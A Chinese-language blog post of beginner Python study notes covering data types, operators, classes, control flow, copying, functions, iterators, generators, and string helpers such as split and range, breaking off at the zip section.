<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">print(a+a) <span class="comment">#[1, 2, 3, 1, 2, 3]</span></span><br><span class="line">print(a*<span class="number">4</span>) <span class="comment">#[1, 2, 3, 1, 2, 3, 1, 2, 3, 1, 2, 3]</span></span><br><span class="line">print(a[::<span class="number">2</span>]) <span class="comment">#[1, 3]</span></span><br><span class="line"></span><br><span class="line">判断是否为空</span><br><span class="line"><span class="keyword">if</span> list</span><br><span class="line">就好，如此简单</span><br></pre></td></tr></table></figure>

<p>位置查找</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a_list = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'hello'</span>]</span><br><span class="line">print(<span class="string">'a'</span> <span class="keyword">in</span> a_list) <span class="comment">#True</span></span><br><span class="line">print(<span class="string">'a'</span> <span class="keyword">not</span> <span class="keyword">in</span> a_list) <span class="comment">#False</span></span><br><span class="line">print(a_list.count(<span class="string">'a'</span>)) <span class="comment">#1</span></span><br><span class="line">print(a_list.index(<span class="string">'a'</span>))	<span class="comment">#0</span></span><br><span class="line">print(a_list.index(<span class="string">'a'</span>,<span class="number">0</span>,<span class="number">1</span>)) <span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">str.remove(<span class="number">2</span>) <span class="comment">#删除元素</span></span><br></pre></td></tr></table></figure>

<h3 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h3><p>虽然tuple的元素不可改变，但它可以包含可变的对象，比如list列表。元组中的元素类型也可以不相同。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tup = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>)</span><br><span class="line">print(tup[<span class="number">0</span>]) <span class="comment">#1</span></span><br></pre></td></tr></table></figure>

<h3 id="集合-Set"><a href="#集合-Set" class="headerlink" title="集合 Set"></a>集合 Set</h3><p>集合（set）是由一个或数个形态各异的大小整体组成的，构成集合的事物或对象称作元素或是成员。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sites = &#123;<span class="string">'Google'</span>, <span class="string">'Taobao'</span>, <span class="string">'Runoob'</span>, <span class="string">'Facebook'</span>, <span class="string">'Zhihu'</span>, <span class="string">'Baidu'</span>&#125;</span><br><span class="line">print(sites)   <span class="comment"># 输出集合，重复的元素被自动去掉</span></span><br></pre></td></tr></table></figure>

<h3 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h3><p>列表是有序的对象集合，字典是无序的对象集合。两者之间的区别在于：字典当中的元素是通过<strong>键来存取</strong>的，而不是通过偏移存取。</p>
<p>用 <strong>{ }</strong> 标识，它是一个无序的 <strong>键(key) : 值(value)</strong> 的集合。</p>
<p>键(key)必须使用不可变类型。在同一个字典中，键(key)必须是唯一的。</p>
<p><img src="/2020/07/30/2020-07-30-python-1/image-20200726181213044.png" alt="image-20200726181213044"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict = &#123;&#125;</span><br><span class="line">dict[<span class="string">'one'</span>] = <span class="string">"1 - 菜鸟教程"</span></span><br><span class="line">dict[<span class="number">2</span>]     = <span class="string">"2 - 菜鸟工具"</span></span><br><span class="line"><span class="keyword">print</span> (dict[<span class="string">'one'</span>])   <span class="comment"># 输出键为 'one' 的值 1 - 菜鸟教程</span></span><br><span class="line"><span class="keyword">print</span> (dict.keys())   <span class="comment"># 输出所有键 dict_keys(['one', 2])</span></span><br><span class="line"><span class="keyword">print</span> (dict.values()) <span class="comment"># 输出所有值 dict_values(['1 - 菜鸟教程', '2 - 菜鸟工具'])</span></span><br><span class="line"></span><br><span class="line"><span class="string">""" 一些操作函数 """</span></span><br><span class="line">dict.get(key, default=<span class="literal">None</span>)<span class="comment"># 返回指定键的值，如果键不在字典中返回 default 设置的默认值</span></span><br><span class="line">key <span class="keyword">in</span> dict <span class="comment">#如果键在字典dict里返回true，否则返回false&lt;---</span></span><br><span class="line">dict.pop(key[,default]) <span class="comment">#删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。</span></span><br><span class="line">dict.values() <span class="comment">#返回一个迭代器，可以使用 list() 来转换为列表</span></span><br><span class="line">dict.items() <span class="comment">#以列表返回可遍历的(键, 值) 元组数组</span></span><br><span class="line">dict.keys() <span class="comment">#返回一个迭代器，可以使用 list() 来转换为列表</span></span><br><span class="line">dict.update(dict2) <span class="comment">#把字典dict2的键/值对更新到dict里</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""  实践  """</span></span><br><span class="line">dictA=&#123;x:x**<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>)&#125; <span class="comment">#创建A</span></span><br><span class="line">dictA[<span class="number">9</span>]=<span class="number">666</span> <span class="comment">#更新</span></span><br><span class="line">dictB=&#123;<span class="number">1</span>:<span class="number">11111</span>,&#125; <span class="comment">#创建B 《---</span></span><br><span class="line">dictA.update(dictB) <span class="comment">#用B替换或添加A 《---</span></span><br><span class="line">print(dictA) <span class="comment">#打印</span></span><br><span class="line">print(dictA.get(<span class="string">"22"</span>)) <span class="comment">#尝试获得键22的值，None</span></span><br><span class="line">print(<span class="number">22</span> <span class="keyword">in</span> dictA) <span class="comment">#False 《---</span></span><br><span class="line">print(dictA.pop(<span class="number">2</span>)) <span class="comment">#删除、弹出键值2的值《---</span></span><br><span class="line">print(dictA.items()) <span class="comment">#A字典的项</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> dictA.values():</span><br><span class="line">    print(item) <span class="comment">#打印所有项</span></span><br></pre></td></tr></table></figure>

<h2 id="转换"><a href="#转换" class="headerlink" title="转换"></a>转换</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">int(x [,base])<span class="comment">#将x转换为一个整数</span></span><br><span class="line">float(x)<span class="comment">#将x转换到一个浮点数</span></span><br><span class="line">repr(x) <span class="comment">#将对象 x 转换为表达式字符串</span></span><br><span class="line">eval(str)<span class="comment">#用来计算在字符串中的有效Python表达式,并返回一个对象</span></span><br><span class="line">list(s)<span class="comment">#将序列 s 转换为一个列表</span></span><br><span class="line">dict(d)<span class="comment">#创建一个字典。d 必须是一个 (key, value)元组序列。</span></span><br><span class="line">chr(x)<span class="comment">#将一个整数转换为一个字符</span></span><br><span class="line">ord(x)<span class="comment">#将一个字符转换为它的整数值</span></span><br></pre></td></tr></table></figure>



<h1 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ** 指数</span></span><br><span class="line">print(<span class="number">5</span>**<span class="number">2</span>) <span class="comment"># 25</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#// 整除 - 向下取接近商的整数,向低位取整</span></span><br><span class="line">print(<span class="number">9</span>/<span class="number">2</span>) <span class="comment">#4.5</span></span><br><span class="line">print(int(<span class="number">9</span>/<span class="number">2</span>)) <span class="comment">#4</span></span><br><span class="line">print(<span class="number">9</span>//<span class="number">2</span>) <span class="comment">#4</span></span><br><span class="line">print(<span class="number">10</span>//<span class="number">2</span>) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">in</span>	 <span class="comment">#如果在指定的序列中找到值返回True，否则返回 False。</span></span><br><span class="line"><span class="keyword">not</span> <span class="keyword">in</span>	<span class="comment">#如果在指定的序列中没有找到值返回 True，否则返回 False。</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">逻辑运算符</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">and</span> <span class="comment">#且</span></span><br><span class="line"><span class="keyword">or</span>  <span class="comment">#或</span></span><br><span class="line"><span class="keyword">not</span> <span class="comment">#反</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">位运算符</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">&amp; <span class="comment">#与</span></span><br><span class="line">| <span class="comment">#或</span></span><br><span class="line">^ <span class="comment">#异或</span></span><br><span class="line">~ <span class="comment">#取反</span></span><br><span class="line">&lt;&lt; <span class="comment">#左移动运算符</span></span><br><span class="line">&gt;&gt; <span class="comment">#右移动运算符</span></span><br><span class="line">x&gt;&gt;=<span class="number">1</span></span><br><span class="line">即x=x&gt;&gt;<span class="number">1</span></span><br></pre></td></tr></table></figure>





<h1 id="队列和栈（队列没有搞好）"><a href="#队列和栈（队列没有搞好）" class="headerlink" title="队列和栈（队列没有搞好）"></a>队列和栈（队列没有搞好）</h1><p><a href="https://blog.csdn.net/yushupan/article/details/82312819" target="_blank" rel="noopener">队列栈</a></p>
<p>队列</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">q = Queue()    <span class="comment">#items = []  #定义一个空队列，无参数，返回值是空队列。</span></span><br><span class="line">enqueue(item)  <span class="comment">#items.append(item)  #在队列尾部加入一个数据项，参数是数据项，无返回值。</span></span><br><span class="line">dequeue()      <span class="comment">#items.pop(0) 删除队列头部的数据项，不需要参数，返回值是被删除的数据，队列本身有变化。</span></span><br><span class="line">peek()     	   <span class="comment">#items[0] 返回栈最顶层的元素，并不删除它。！</span></span><br><span class="line">isEmpty()      <span class="comment">#self.items == [] 检测队列是否为空。无参数，返回布尔值。</span></span><br><span class="line">clear()        <span class="comment">#del(items) 清空队列，无参无返回值</span></span><br><span class="line">size()         <span class="comment">#len(items) 返回队列数据项的数量。无参数，返回一个整</span></span><br><span class="line">print(q)	   <span class="comment">#print(self.items)</span></span><br></pre></td></tr></table></figure>

<p>栈</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Stack()    <span class="comment">#items = [] 建立一个空的栈对象。</span></span><br><span class="line">push(item) <span class="comment">#items.append(item) 把一个元素添加到栈的最顶层。</span></span><br><span class="line">pop()      <span class="comment">#items.pop() 删除栈最顶层的元素，并返回这个元素。！</span></span><br><span class="line">peek()     <span class="comment">#items[-1] 返回栈最顶层的元素，并不删除它。！</span></span><br><span class="line">clear()    <span class="comment">#del(self.items) 清空栈。</span></span><br><span class="line">isEmpty()  <span class="comment">#self.items == [] 判断栈是否为空。</span></span><br><span class="line">size()     <span class="comment">#返回栈中元素的个数。</span></span><br><span class="line">print(q)   <span class="comment">#print(self.items)</span></span><br></pre></td></tr></table></figure>



<h1 id="python的类，对象"><a href="#python的类，对象" class="headerlink" title="python的类，对象"></a>python的类，对象</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parent</span>:</span>        <span class="comment"># 定义父类</span></span><br><span class="line">   ___secretCount = <span class="number">0</span>  <span class="comment"># 私有变量</span></span><br><span class="line">   publicCount = <span class="number">0</span>    <span class="comment"># 公开变量</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">myMethod</span><span class="params">(self)</span>:</span></span><br><span class="line">      <span class="keyword">print</span> (<span class="string">'调用父类方法'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span><span class="params">(Parent)</span>:</span> <span class="comment"># 定义子类</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">myMethod</span><span class="params">(self)</span>:</span></span><br><span class="line">      <span class="keyword">print</span> (<span class="string">'调用子类方法'</span>)</span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">__foo</span><span class="params">(self)</span>:</span>          <span class="comment"># 私有方法</span></span><br><span class="line">        print(<span class="string">'这是私有方法'</span>)</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(self)</span>:</span>            <span class="comment"># 公共方法</span></span><br><span class="line">        print(<span class="string">'这是公共方法'</span>)</span><br><span class="line">        self.__foo()</span><br><span class="line"> </span><br><span class="line">c = Child()          <span class="comment"># 子类实例</span></span><br><span class="line">c.myMethod()         <span class="comment"># 子类调用重写方法</span></span><br><span class="line">super(Child,c).myMethod() <span class="comment">#用子类对象调用父类已被覆盖的方法</span></span><br><span class="line">c.foo()        <span class="comment"># 正常输出</span></span><br><span class="line">c.__foo()      <span class="comment"># 报错,私有方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 树类的三种开头</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment"># class TreeNode():</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.left = <span class="literal">None</span></span><br><span class="line">        self.right = <span class="literal">None</span></span><br></pre></td></tr></table></figure>



<h1 id="IF-ELSE、While、FOR"><a href="#IF-ELSE、While、FOR" class="headerlink" title="IF\ELSE、While、FOR"></a>IF\ELSE、While、FOR</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition_1:</span><br><span class="line">    statement_block_1</span><br><span class="line"><span class="keyword">elif</span> condition_2:</span><br><span class="line">    statement_block_2</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    statement_block_3</span><br><span class="line">    </span><br><span class="line"><span class="keyword">while</span> 判断条件(condition)：</span><br><span class="line">    执行语句(statements)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> &lt;expr&gt;:</span><br><span class="line">    &lt;statement(s)&gt;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    &lt;additional_statement(s)&gt;</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 类似if语句的语法，while循环体中只有一条语句，可以将该语句与while写在同一行中</span></span><br><span class="line"><span class="keyword">while</span> (flag): <span class="keyword">print</span> (<span class="string">'欢迎访问菜鸟教程!'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &lt;variable&gt; <span class="keyword">in</span> &lt;sequence&gt;:</span><br><span class="line">    &lt;statements&gt;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    &lt;statements&gt;</span><br><span class="line">    </span><br><span class="line"><span class="comment">#如下为冒泡排序</span></span><br><span class="line">a=[x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>,<span class="number">0</span>,<span class="number">-1</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a),<span class="number">1</span>,<span class="number">-1</span>): <span class="comment">#遍历10次</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,i<span class="number">-1</span>): <span class="comment">#逐渐变小</span></span><br><span class="line">        <span class="keyword">if</span> a[j]&gt;a[j+<span class="number">1</span>]:</span><br><span class="line">            a[j],a[j+<span class="number">1</span>]=a[j+<span class="number">1</span>],a[j]</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>

<h1 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#输入</span></span><br><span class="line">str = input(<span class="string">"请输入："</span>);</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"你输入的内容是: "</span>, str)</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="comment"># 可选项 : 和格式标识符可以跟着字段名。 这就允许对值进行更好的格式化。 下面的例子将 Pi 保留到小数点后三位：</span></span><br><span class="line">print(<span class="string">'常量 PI 的值近似为 &#123;0:.3f&#125;'</span>.format(math.pi)) <span class="comment">#新版</span></span><br><span class="line">print(<span class="string">'常量 PI 的值近似为 %5.3f'</span> % math.pi) <span class="comment">#旧版</span></span><br><span class="line"><span class="comment"># 常量 PI 的值近似为：3.142</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"%d"</span>%<span class="number">1</span>) <span class="comment">#旧版输出1</span></span><br><span class="line">print(<span class="string">"&#123;0&#125;"</span>.format(<span class="number">1</span>)) <span class="comment">#新版输出1</span></span><br><span class="line">print(<span class="number">1</span>) <span class="comment">#;-)</span></span><br><span class="line"></span><br><span class="line">a=<span class="string">'Google'</span></span><br><span class="line">b=<span class="string">'Runoob'</span></span><br><span class="line">print(<span class="string">"法1"</span>,a,<span class="string">"和"</span>,b) <span class="comment">#逗号</span></span><br><span class="line">print(<span class="string">'法2 &#123;Google&#125; 和 &#123;Runoob&#125;'</span>.format(Google=<span class="string">'Google'</span>, Runoob=<span class="string">'Runoob'</span>))<span class="comment"># 如果在 format() 中使用了关键字参数, 那么它们的值会指向使用该名字的参数。</span></span><br><span class="line">print(<span class="string">'法3 &#123;0&#125; 和 &#123;1&#125;'</span>.format(<span class="string">'Google'</span>, <span class="string">'Runoob'</span>)) <span class="comment">#</span></span><br></pre></td></tr></table></figure>





<h2 id="深拷贝浅拷贝"><a href="#深拷贝浅拷贝" class="headerlink" title="深拷贝浅拷贝"></a>深拷贝浅拷贝</h2><p><a href="https://www.cnblogs.com/xiaxiaoxu/p/9742452.html" target="_blank" rel="noopener">深拷贝与浅拷贝区别</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c=copy.copy(a)<span class="comment">#对象拷贝，浅拷贝</span></span><br><span class="line">d=copy.deepcopy(a)<span class="comment">#对象拷贝，深拷贝</span></span><br></pre></td></tr></table></figure>

<p>实例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line">a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,[<span class="string">'a'</span>,<span class="string">'b'</span>]]</span><br><span class="line"><span class="comment">#原始对象</span></span><br><span class="line">b=a<span class="comment">#赋值，传对象的引用</span></span><br><span class="line">c=copy.copy(a)<span class="comment">#对象拷贝，浅拷贝</span></span><br><span class="line">d=copy.deepcopy(a)<span class="comment">#对象拷贝，深拷贝</span></span><br><span class="line">a[<span class="number">1</span>]=<span class="number">666</span></span><br><span class="line">print(<span class="string">"a="</span>,a,<span class="string">"    id(a)="</span>,id(a),<span class="string">"id(a[5])="</span>,id(a[<span class="number">5</span>]))</span><br><span class="line">print(<span class="string">"b="</span>,b,<span class="string">"    id(b)="</span>,id(b),<span class="string">"id(b[5])="</span>,id(b[<span class="number">5</span>]))<span class="comment">#与a相同</span></span><br><span class="line">print(<span class="string">"c="</span>,c,<span class="string">"    id(c)="</span>,id(c),<span class="string">"id(c[5])="</span>,id(c[<span class="number">5</span>]))<span class="comment">#c[5]列表的地址与a相同,其他不同</span></span><br><span class="line">print(<span class="string">"d="</span>,d,<span class="string">"    id(d)="</span>,id(d),<span class="string">"id(d[5])="</span>,id(d[<span class="number">5</span>]))<span class="comment">#</span></span><br><span class="line">print(<span class="string">"*"</span>*<span class="number">70</span>)</span><br><span class="line"></span><br><span class="line">a.append(<span class="number">6</span>)<span class="comment">#修改对象a</span></span><br><span class="line">a[<span class="number">5</span>].append(<span class="string">'c'</span>)<span class="comment">#修改对象a中的['a','b']数组对象</span></span><br><span class="line">print(<span class="string">"a="</span>,a,<span class="string">"    id(a)="</span>,id(a),<span class="string">"id(a[5])="</span>,id(a[<span class="number">5</span>]))</span><br><span class="line">print(<span class="string">"b="</span>,b,<span class="string">"    id(b)="</span>,id(b),<span class="string">"id(b[5])="</span>,id(b[<span class="number">5</span>]))</span><br><span class="line">print(<span class="string">"c="</span>,c,<span class="string">"       id(c)="</span>,id(c),<span class="string">"id(c[5])="</span>,id(c[<span class="number">5</span>]))</span><br><span class="line">print(<span class="string">"d="</span>,d,<span class="string">"            id(d)="</span>,id(d),<span class="string">"id(d[5])="</span>,id(d[<span class="number">5</span>]))</span><br></pre></td></tr></table></figure>





<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 不可变对象实例</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ChangeInt</span><span class="params">( a )</span>:</span></span><br><span class="line">    a = <span class="number">10</span></span><br><span class="line">b = <span class="number">2</span></span><br><span class="line">ChangeInt(b)</span><br><span class="line">print( b ) <span class="comment"># 结果是 2，没变</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 可变对象实例</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeme</span><span class="params">( mylist )</span>:</span></span><br><span class="line">   <span class="string">"修改传入的列表"</span></span><br><span class="line">   mylist.append([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line">mylist = [<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>]</span><br><span class="line">changeme( mylist )</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"函数外取值: "</span>, mylist)<span class="comment">#添加了新值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#必须参数，正确的顺序 </span></span><br><span class="line">fun(<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>,<span class="string">"d"</span>)</span><br><span class="line"><span class="comment">#关键字参数</span></span><br><span class="line">fun(ea=<span class="string">"a"</span>,eb=<span class="string">"b"</span>,ec=<span class="string">"c"</span>,ed=<span class="string">"d"</span>)</span><br><span class="line"><span class="comment">#默认参数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(name, age = <span class="number">35</span> )</span></span></span><br><span class="line"><span class="function">#不定长参数</span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">functionname</span><span class="params">([formal_args,] *var_args_tuple )</span>:</span></span><br><span class="line">   <span class="string">"函数_文档字符串"</span></span><br><span class="line">   function_suite</span><br><span class="line">   <span class="keyword">return</span> [expression]</span><br><span class="line"><span class="comment">#匿名函数lambda</span></span><br><span class="line">sum = <span class="keyword">lambda</span> arg1, arg2: arg1 + arg2  <span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"相加后的值为 : "</span>, sum( <span class="number">10</span>, <span class="number">20</span> ))  <span class="comment"># 调用sum函数</span></span><br></pre></td></tr></table></figure>



<h1 id="迭代器-amp-生成器"><a href="#迭代器-amp-生成器" class="headerlink" title="迭代器&amp;生成器"></a>迭代器&amp;生成器</h1><p>迭代器对象从集合的第一个元素开始访问，直到所有的元素被访问完结束。迭代器只能往前不会后退。</p>
<p>迭代器有两个基本的方法：iter() 和 next()。</p>
<p>字符串，列表或元组对象都可用iter() 创建迭代器：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyNumbers</span>:</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.a = <span class="number">1</span> <span class="comment">#置初值</span></span><br><span class="line">    <span class="keyword">return</span> self</span><br><span class="line"> </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__next__</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> self.a &lt;= <span class="number">20</span>:</span><br><span class="line">      x = self.a </span><br><span class="line">      self.a += <span class="number">1</span> <span class="comment">#加1</span></span><br><span class="line">      <span class="keyword">return</span> x</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">raise</span> StopIteration <span class="comment">#大于20结束 ，StopIteration 异常用于标识迭代的完成</span></span><br><span class="line"> </span><br><span class="line">myclass = MyNumbers()</span><br><span class="line">myiter = iter(myclass)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> myiter:</span><br><span class="line">  print(x)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="number">1</span></span><br><span class="line">...</span><br><span class="line"><span class="number">19</span></span><br><span class="line"><span class="number">20</span></span><br></pre></td></tr></table></figure>

<p>在 Python 中，使用了 yield 的函数被称为生成器（generator）。</p>
<p>跟普通函数不同的是，生成器是一个返回迭代器的函数，只能用于迭代操作，更简单点理解生成器就是一个迭代器。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fibonacci</span><span class="params">(n)</span>:</span> <span class="comment"># 生成器函数 - 斐波那契</span></span><br><span class="line">    a, b, counter = <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> (counter &gt; n): </span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">yield</span> a</span><br><span class="line">        a, b = b, a + b</span><br><span class="line">        counter += <span class="number">1</span></span><br><span class="line">f = fibonacci(<span class="number">10</span>) <span class="comment"># f 是一个迭代器，由生成器返回生成</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">print</span> (next(f), end=<span class="string">" "</span>)</span><br><span class="line">    <span class="keyword">except</span> StopIteration:</span><br><span class="line">        sys.exit()</span><br><span class="line">        </span><br><span class="line">&gt;&gt;&gt;<span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">5</span> <span class="number">8</span> <span class="number">13</span> <span class="number">21</span> <span class="number">34</span> <span class="number">55</span></span><br></pre></td></tr></table></figure>



<h2 id="一些简单的操作"><a href="#一些简单的操作" class="headerlink" title="一些简单的操作"></a>一些简单的操作</h2><h2 id="range"><a href="#range" class="headerlink" title="range()"></a>range()</h2><p>左闭右开区间 [ )，开区间的端点值取不到，而闭区间的端点值就可以取到。</p>
<p>想要生成list，需要用list()函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">range(start, stop[, step])</span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<ul>
<li>start: 计数从 start 开始。默认是从 0 开始。例如range（5）等价于range（0， 5）;</li>
<li>stop: <strong>计数到 stop 结束，但不包括 stop</strong>。例如：range（0， 5） 是[0, 1, 2, 3, 4]没有5</li>
<li>step：步长，默认为1。例如：range（0， 5） 等价于 range(0, 5, 1)</li>
</ul>
<h2 id="split"><a href="#split" class="headerlink" title="split()"></a>split()</h2><p><a href="https://www.cnblogs.com/ilovecpp/p/12802178.html" target="_blank" rel="noopener">split详解</a></p>
<p>1、<code>split()</code> 函数<br>语法：<code>str.split(str=&quot;&quot;,num=string.count(str))[n]</code></p>
<p>参数说明：<br><code>str</code>: 表示为分隔符，默认为空格，但是不能为空(‘’)。若字符串中没有分隔符，则把整个字符串作为列表的一个元素<br><code>num</code>: 表示分割次数。如果存在参数num，则仅分隔成 num+1 个子字符串，并且每一个子字符串可以赋给新的变量</p>
<p><code>n</code>：表示选取第n个分片</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">string = <span class="string">"www.gziscas.com.cn"</span></span><br><span class="line">print(string.split(<span class="string">'.'</span>))<span class="comment"># ['www', 'gziscas', 'com', 'cn']</span></span><br><span class="line">print(string.split(<span class="string">'.'</span>,<span class="number">2</span>))<span class="comment"># ['www', 'gziscas', 'com.cn']</span></span><br><span class="line">print(string.split(<span class="string">'.'</span>,<span class="number">2</span>)[<span class="number">1</span>])<span class="comment">#gziscas</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">print(os.path.split(<span class="string">'/dodo/soft/python/'</span>))<span class="comment">#('/dodo/soft/python', '')</span></span><br><span class="line">print(os.path.split(<span class="string">'/dodo/soft/python'</span>))<span class="comment">#('/dodo/soft', 'python')</span></span><br><span class="line">str=<span class="string">"hello boy&lt;[www.baidu.com]&gt;byebye"</span></span><br><span class="line">print(str.split(<span class="string">"["</span>)[<span class="number">1</span>].split(<span class="string">"]"</span>)[<span class="number">0</span>]) <span class="comment"># www.baidu.com</span></span><br></pre></td></tr></table></figure>

<h2 id="最大值"><a href="#最大值" class="headerlink" title="最大值"></a>最大值</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">最大值：sys.maxsize  float(<span class="string">"inf"</span>)</span><br><span class="line">最小值：-sys.maxsize  float(<span class="string">"-inf"</span>)</span><br><span class="line"></span><br><span class="line">float(<span class="string">"-inf"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">float(<span class="string">"inf"</span>) <span class="comment">#不是int，但是比所有int都大</span></span><br><span class="line">&gt;&gt; inf </span><br><span class="line">print(float(<span class="string">"inf"</span>)&gt;sys.maxsize)</span><br><span class="line">&gt;&gt; <span class="literal">True</span></span><br><span class="line">-sys.maxsize&gt;float(<span class="string">"-inf"</span>)</span><br><span class="line">&gt;&gt; <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h2 id="zip-函数：可以用来当list左旋的操作"><a href="#zip-函数：可以用来当list左旋的操作" class="headerlink" title="zip() 函数：可以用来当list左旋的操作"></a>zip() 函数：可以用来当list左旋的操作</h2><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p><strong>zip()</strong> 函数用于将可迭代的对象作为参数，将对象中对应的元素打包成一个个元组，然后返回由这些元组组成的列表。</p>
